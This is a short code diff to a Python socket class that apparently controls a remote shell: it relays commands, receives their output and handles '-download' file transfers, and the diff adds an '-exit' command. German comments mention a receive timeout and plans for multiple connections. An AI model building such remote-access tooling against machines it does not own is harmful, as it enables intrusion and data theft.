@@ -38,6 +38,8 @@ class Socket:
             name = name.replace("-download ", "")
             self.receive_command_output(download=True, file_ending=ending, file_name=name)
             return
+        if "-exit" in command.decode():
+            return
         self.receive_command_output()
 
     def receive_command_output(self, download=False, file_ending="", file_name=""):
@@ -82,7 +84,8 @@ while True:
 
 
 # uhblajkil.cf
-# macnhmal bleibt server stuck beim empfangen vllt richitges Timeout einbauen
+# macnhmal bleibt server stuck beim empfangen vllt richitges Timeout einbauen   ??
+# Multiconnection
 
 
 
